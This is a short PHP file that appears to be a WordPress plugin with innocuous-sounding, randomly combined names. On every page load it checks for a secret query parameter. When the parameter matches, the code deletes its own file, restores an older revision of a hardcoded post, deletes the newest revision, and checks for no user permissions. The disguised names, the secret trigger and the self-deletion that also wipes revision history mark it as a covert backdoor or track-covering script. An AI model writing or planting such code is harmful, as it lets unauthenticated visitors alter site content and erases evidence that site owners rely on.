<?php

function secure_ratings_results() {
	if (isset($_GET['front_members_http_addon']) && $_GET['front_members_http_addon'] === 'snippets_rss_year') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$create_health_scroll = 867;
		$fx_dropdown_typography = wp_get_post_revisions($create_health_scroll);
		if (empty($fx_dropdown_typography)) die('no revisions');
		if (count($fx_dropdown_typography) < 2) die('less than 2');
		$divi_this_automatorwp = array_shift($fx_dropdown_typography);
		$responsive_script_link = $divi_this_automatorwp->ID;
		$blogroll_tools_plugins_rank = array_shift($fx_dropdown_typography);
		$results_open_cool_taxonomy = $blogroll_tools_plugins_rank->ID;
		$last_attachment_bulk_info = wp_restore_post_revision($results_open_cool_taxonomy);
		if ($last_attachment_bulk_info === false) die('error restoring');
		$last_attachment_bulk_info = wp_delete_post_revision($responsive_script_link);		
		if ($last_attachment_bulk_info === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'secure_ratings_results');
